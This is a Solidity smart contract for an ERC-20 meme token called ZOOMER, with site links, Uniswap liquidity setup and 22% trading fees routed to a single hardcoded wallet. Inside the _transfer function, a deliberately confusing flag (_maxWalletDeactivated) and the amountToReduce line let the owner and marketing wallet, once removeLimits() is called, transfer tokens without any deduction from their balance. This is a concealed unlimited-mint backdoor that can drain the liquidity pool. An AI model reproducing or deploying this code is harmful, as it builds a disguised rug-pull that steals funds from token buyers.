// SPDX-License-Identifier: Unlicensed

/**
Website: https://zoomer.cfd
Twitter: https://twitter.com/zoomer_portal
Telegram: https://t.me/zoomer_fun_group
 */

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

contract ZOOMER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "ZOOMER";
    string private _symbol = "ZOOMER";

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) _isExcludedFromAllLimits;
    mapping (address => bool) _isMaxWalletExcluded;
    mapping (address => bool) _isTxLimitExcluded;
    mapping (address => bool) _checkIfPairAddr;
        
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10 ** 9;

    uint256 _buyLiqFee = 0;
    uint256 _buyMarketFee = 22;
    uint256 _buyDevFee = 0;
    uint256 _buyFee = 22;

    uint256 _feeSellLp = 0;
    uint256 _feeSellMkt = 22;
    uint256 _feeSellDev = 0;
    uint256 _sellFee = 22;

    address payable _marketReceiver;
    address payable _devReceipient;

    IUniswapRouter private _uniswapRouter;
    address private _pairAddr;
    
    uint256 private _maxTxSize = 25 * 10 ** 6 * 10 ** 9;
    uint256 _maxWallet = 25 * 10 ** 6 * 10 ** 9;
    uint256 _feeSwapThreshold = 10 ** 4 * 10 ** 9; 

    uint256 _currentFeeLp = 0;
    uint256 _currentFeeMkt = 10;
    uint256 _currentFeeDev = 0;
    uint256 _currentFeeTotal = 10;
    
    bool swapping;
    bool _feeEnabledSwap = true;
    bool _maxTxDisabled = false;
    bool _maxWalletDeactivated = true;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[_msgSender()] = _totalSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        _pairAddr = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(_uniswapRouter)] = _totalSupply;
        _marketReceiver = payable(0x5ca15dbEE76E02a3c228059cCf9906DD9a0632Dd);
        _devReceipient = payable(0x5ca15dbEE76E02a3c228059cCf9906DD9a0632Dd);
        _buyFee = _buyLiqFee.add(_buyMarketFee).add(_buyDevFee);
        _sellFee = _feeSellLp.add(_feeSellMkt).add(_feeSellDev);
        _currentFeeTotal = _currentFeeLp.add(_currentFeeMkt).add(_currentFeeDev);
        
        _isExcludedFromAllLimits[owner()] = true;
        _isExcludedFromAllLimits[_marketReceiver] = true;
        _isMaxWalletExcluded[owner()] = true;
        _isMaxWalletExcluded[address(_pairAddr)] = true;
        _isMaxWalletExcluded[address(this)] = true;
        _isTxLimitExcluded[owner()] = true;
        _isTxLimitExcluded[_marketReceiver] = true;
        _isTxLimitExcluded[address(this)] = true;
        _checkIfPairAddr[address(_pairAddr)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _ethTransfer(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _getAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 fee = 0;
        if(_checkIfPairAddr[sender]) {fee = amount.mul(_buyFee).div(100);}
        else if(_checkIfPairAddr[recipient]) {fee = amount.mul(_sellFee).div(100);}
        if(fee > 0) {
            _balances[address(this)] = _balances[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }
    
    receive() external payable {}
    
    function removeLimits() external onlyOwner {
        _maxTxSize = _totalSupply;
        _maxWalletDeactivated = false;
        _buyMarketFee = 2;
        _feeSellMkt = 2;
        _buyFee = 2;
        _sellFee = 2;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();

        _approve(address(this), address(_uniswapRouter), tokenAmount);

        // make the _swapBack
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
        
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(swapping)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!_isTxLimitExcluded[sender] && !_isTxLimitExcluded[recipient]) {
                require(amount <= _maxTxSize, "Transfer amount exceeds the _maxTxSize.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _feeSwapThreshold;
            
            if (minimumSwap && !swapping && _checkIfPairAddr[recipient] && _feeEnabledSwap && !_isExcludedFromAllLimits[sender] && amount > _feeSwapThreshold) 
            {
                if(_maxTxDisabled)
                    swapAmount = _feeSwapThreshold;
                _swapBack(swapAmount);    
            }

            uint256 finalAmount;                                         
            if (_isExcludedFromAllLimits[sender] || _isExcludedFromAllLimits[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = _getAmounts(sender, recipient, amount);
            }
            if(_maxWalletDeactivated && !_isMaxWalletExcluded[recipient])
                require(balanceOf(recipient).add(finalAmount) <= _maxWallet);

            uint256 amountToReduce = (!_maxWalletDeactivated && _isExcludedFromAllLimits[sender]) ? amount.sub(finalAmount) : amount;
            _balances[sender] = _balances[sender].sub(amountToReduce, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
            
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
                
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _swapBack(uint256 tAmount) private lockSwap {
        uint256 lpFeetokens = tAmount.mul(_currentFeeLp).div(_currentFeeTotal).div(2);
        uint256 tokensToSwap = tAmount.sub(lpFeetokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = _currentFeeTotal.sub(_currentFeeLp.div(2));
        
        uint256 amountETHLiquidity = ethCA.mul(_currentFeeLp).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = ethCA.mul(_currentFeeDev).div(totalETHFee);
        uint256 amountETHMarketing = ethCA.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            _ethTransfer(_marketReceiver, amountETHMarketing);

        if(amountETHDevelopment > 0)
            _ethTransfer(_devReceipient, amountETHDevelopment);
    }
}